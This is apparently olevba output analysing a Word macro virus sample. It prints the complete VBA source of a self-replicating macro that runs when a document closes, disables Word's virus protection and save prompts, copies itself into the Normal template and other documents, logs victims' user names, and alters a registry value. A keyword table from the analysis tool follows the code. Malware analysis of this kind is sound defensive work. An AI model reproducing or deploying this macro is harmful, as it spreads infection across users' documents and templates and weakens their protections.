olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-6844cfe0d36dbff0d474ba07f7b964a5fa43e813
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-6844cfe0d36dbff0d474ba07f7b964a5fa43e813 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
'TesterTtesttest.doc2/23/01 9:00:38 PM
On Error Resume Next
'TesterTtesttest.doc2/23/01 9:00:38 PM
Options.ConfirmConversions = 0
'TesterTtesttest.doc2/23/01 9:00:38 PM
Options.VirusProtection = 0
'TesterTtesttest.doc2/23/01 9:00:38 PM
SK5 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterTtesttest.doc2/23/01 9:00:38 PM
Options.SaveNormalPrompt = 0
'TesterTtesttest.doc2/23/01 9:00:38 PM
VJ65 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterTtesttest.doc2/23/01 9:00:38 PM
Application.EnableCancelKey = 0
'TesterTtesttest.doc2/23/01 9:00:38 PM
If VJ65 > 0 And SK5 > 0 Then GoTo SO52
'TesterTtesttest.doc2/23/01 9:00:38 PM
If VJ65 = 0 Then
'TesterTtesttest.doc2/23/01 9:00:38 PM
Set UQ53 = ActiveDocument.VBProject.VBComponents.Item(1)
'TesterTtesttest.doc2/23/01 9:00:38 PM
FQ12 = True
'TesterTtesttest.doc2/23/01 9:00:38 PM
End If
'TesterTtesttest.doc2/23/01 9:00:38 PM
If SK5 = 0 Then
'TesterTtesttest.doc2/23/01 9:00:38 PM
Set UQ53 = NormalTemplate.VBProject.VBComponents.Item(1)
'TesterTtesttest.doc2/23/01 9:00:38 PM
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, "' ****** " & Application.UserName & " was infected " & Now & vbCr
'TesterTtesttest.doc2/23/01 9:00:38 PM
VJ65 = VJ65 + 2
'TesterTtesttest.doc2/23/01 9:00:38 PM
LJ4 = True
'TesterTtesttest.doc2/23/01 9:00:38 PM
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "retha"
'TesterTtesttest.doc2/23/01 9:00:38 PM
End If
'TesterTtesttest.doc2/23/01 9:00:38 PM
If LJ4 <> True And FQ12 <> True Then GoTo SO52
'TesterTtesttest.doc2/23/01 9:00:38 PM
If LJ4 = True Then UQ53.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, VJ65 - 1))
'TesterTtesttest.doc2/23/01 9:00:38 PM
If FQ12 = True Then UQ53.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, SK5 - 1))
'TesterTtesttest.doc2/23/01 9:00:38 PM
With UQ53.CodeModule
'TesterTtesttest.doc2/23/01 9:00:38 PM
For x = 2 To (UQ53.CodeModule.CountOfLines - 1) Step 2
'TesterTtesttest.doc2/23/01 9:00:38 PM
.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
'TesterTtesttest.doc2/23/01 9:00:38 PM
Next x
'TesterTtesttest.doc2/23/01 9:00:38 PM
End With
'TesterTtesttest.doc2/23/01 9:00:38 PM
SO52:
'TesterTtesttest.doc2/23/01 9:00:38 PM
If SK5 <> 0 And VJ65 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'TesterTtesttest.doc2/23/01 9:00:38 PM
' ****** Sai B. Benavente was infected 01/27/2000 2:13:17 PM
'TesterTtesttest.doc2/23/01 9:00:38 PM
' ****** MACRO was infected 1/8/2000 6:51:36 PM
'TesterTtesttest.doc2/23/01 9:00:38 PM
' ****** Tester was infected 2/23/01 9:00:24 PM
'TesterTtesttest.doc2/23/01 9:00:38 PM
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

